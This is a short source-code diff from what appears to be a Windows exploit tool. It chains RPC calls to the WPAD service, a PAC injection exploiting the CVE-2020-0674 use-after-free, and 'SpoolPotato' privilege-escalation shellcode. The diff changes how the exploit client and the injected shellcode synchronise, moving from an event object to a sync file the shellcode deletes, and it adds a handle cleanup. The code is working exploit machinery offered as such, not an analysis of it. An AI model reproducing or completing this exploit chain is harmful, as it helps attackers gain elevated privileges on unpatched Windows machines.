@@ -246,15 +246,15 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         the CVE-2020-0674 UAF.
 
         The WPAD client initially:
-        1. Creates an unsignalled event object and then proceeds to repeatedly make RPC calls to WPAD in a loop
-        2. Between each iteration of the loop it spends several seconds waiting for a signal on its event object.
-           If this operation times out, it continues the loop.
-        3. Once the event has been signalled the WPAD client ends its loop and terminates.
+        1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
+        2. Between each iteration of the loop it spends several seconds waiting for the signal file it
+           previously created to be deleted by SpoolPotato.
+        3. Once the event file has been deleted the WPAD client ends its loop and terminates.
 
         Meanwhile the SpoolPotato shellcode:
         1. Makes its privilege escalation operations.
-        2. Waits for the named event object from the WPAD client to be created.
-        3. Signals the event object once it has been created.
+        2. Waits for the sync event file to be created by the WPAD client.
+        3. Deletes the event file to signal completion to the WPAD client.
         4. Terminates itself.
         */
 
@@ -273,11 +273,13 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
                         DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
                         Sleep(3000);
                         hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
                         if (hFile == INVALID_HANDLE_VALUE) {
                             DebugLog(L"... received sync signal from code within WPAD");
                             break;
                         }
                         else {
+                            CloseHandle(hFile);
                             DebugLog(L"... timed out waiting on sync signal from code within WPAD");
                         }
                     }
